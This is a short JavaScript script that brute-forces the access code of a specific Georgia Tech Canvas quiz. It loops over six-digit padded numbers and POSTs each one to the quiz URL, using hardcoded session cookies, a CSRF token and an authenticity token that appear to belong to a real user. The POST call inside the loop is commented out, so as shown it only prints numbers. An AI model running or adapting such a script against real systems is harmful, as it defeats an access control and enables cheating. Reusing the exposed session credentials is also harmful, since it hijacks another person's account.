

async function fetchData(paddedNumber) {
    try {
        let x = await fetch("https://gatech.instructure.com/courses/368540/quizzes/541239/take?user_id=319636", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"macOS\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": "dpUseLegacy=true; log_session_id=4fc7c9ee80a76738d6b2cc2e23d2480d; _legacy_normandy_session=om0jTY3xYIfJw1h9X1YqAA+ZSZjwgVLPeHmXoKvVz2USOBKCKVfLNYJEryPtho45y8IPaki2LfVQ_g4y13Q7xkUthvFnAI7-IrldjdTvuqEoxWtBMYHh8sSjjwsP8c4MifTyCM1KZNvdQU_Bqku4ZQ8tzhRfxp0Lja5ooPSb5EBzMQTXVj9qof3Ic1VAFbPfKC1JI3HKuKsBw9RjKa388gqYk7QqG0WZ7gxFm-unBNPV8qGe0o_VKVNAdYFjAc_8qVbcuvV2Y8_2eK4R6V5gn7_QYK3AQVJaOfofCjKE1XQ8nHOsSLkql1I8NJVZTpdgInbRxk5QHQ3FnIie6J_MxdIlFn5Q5oJ4ppWHD_p_EsMCe6AVEEFf_EZTWuyullsQm4RvCqpUILDegMwxPYtyGwFufWWjXJlZUKcU5e-q3VRNNL7ZhrFvjMuDyOnYubXi6mZfvivlurmXXqBAJF_oyUtLTGON97FwoEedBbxjun-FxEnkr1aKjRvNWTeMVxCFv11CL7EA2eJkPoPyJjUjCLFqzoKYIrnFhldd0gwbEEXY6FT3A0XHygIz1EtyuxJeBbWvx4rNZRcN_fyqtA3ux3f8mrybe_92YSi44iRZPvpiqHNGnb-0gigWK8t0aA-lVQH3uBMRPuia2PhAHPbiSltheOjC0wZdUYzXPpF1Ww_kZaWUDPXFOIfKkB3FClQ05i66wZinJvkkPcnxUUdOrZONkjGPaTzqx3wicQu7gnQNGbDSRvRPdTrkdxiyeKvzYeS8dD77RwR3-bW9ZY-1PsmfDqB1wSMRXM_BFtCfDEthA.VfmI_lq69efVC-bIujifb7TOS7A.Zbl6_g; canvas_session=om0jTY3xYIfJw1h9X1YqAA+ZSZjwgVLPeHmXoKvVz2USOBKCKVfLNYJEryPtho45y8IPaki2LfVQ_g4y13Q7xkUthvFnAI7-IrldjdTvuqEoxWtBMYHh8sSjjwsP8c4MifTyCM1KZNvdQU_Bqku4ZQ8tzhRfxp0Lja5ooPSb5EBzMQTXVj9qof3Ic1VAFbPfKC1JI3HKuKsBw9RjKa388gqYk7QqG0WZ7gxFm-unBNPV8qGe0o_VKVNAdYFjAc_8qVbcuvV2Y8_2eK4R6V5gn7_QYK3AQVJaOfofCjKE1XQ8nHOsSLkql1I8NJVZTpdgInbRxk5QHQ3FnIie6J_MxdIlFn5Q5oJ4ppWHD_p_EsMCe6AVEEFf_EZTWuyullsQm4RvCqpUILDegMwxPYtyGwFufWWjXJlZUKcU5e-q3VRNNL7ZhrFvjMuDyOnYubXi6mZfvivlurmXXqBAJF_oyUtLTGON97FwoEedBbxjun-FxEnkr1aKjRvNWTeMVxCFv11CL7EA2eJkPoPyJjUjCLFqzoKYIrnFhldd0gwbEEXY6FT3A0XHygIz1EtyuxJeBbWvx4rNZRcN_fyqtA3ux3f8mrybe_92YSi44iRZPvpiqHNGnb-0gigWK8t0aA-lVQH3uBMRPuia2PhAHPbiSltheOjC0wZdUYzXPpF1Ww_kZaWUDPXFOIfKkB3FClQ05i66wZinJvkkPcnxUUdOrZONkjGPaTzqx3wicQu7gnQNGbDSRvRPdTrkdxiyeKvzYeS8dD77RwR3-bW9ZY-1PsmfDqB1wSMRXM_BFtCfDEthA.VfmI_lq69efVC-bIujifb7TOS7A.Zbl6_g; _csrf_token=aYOgdv5gHW3LpFcowsU5Q7NfgLez9RFBzPwbFNd3JxwltO5HiAdvN%2FjMLh6t9mguhWm3zdLGYAf8zFJmvx1ESA%3D%3D",
                "Referer": "https://gatech.instructure.com/courses/368540/quizzes/541239/take?user_id=319636",
                "Referrer-Policy": "no-referrer-when-downgrade"
            },
            "body": `utf8=%E2%9C%93&authenticity_token=tAP1XpeHKvxSY82w3l3bZbeq0FcP6d86wW2Ac%2FyUnmD4NLtv4eBYpmELtIaxbooIgZznLW7arnzxXckBlP79NA%3D%3D&access_code=${paddedNumber}`,
            "method": "POST"
        });

        console.log(x)
    } catch (e) {
        console.log(e)
    }
}

function delayedOutput() {
    for (let i = 0; i < 99999 + 1; i++) {
        const pad = String(i).padStart(6, '0'); // Pad the number with leading zeros
        console.log(pad); // Output the string
        // fetchData(pad);
    }
}

delayedOutput(); // Start the loop
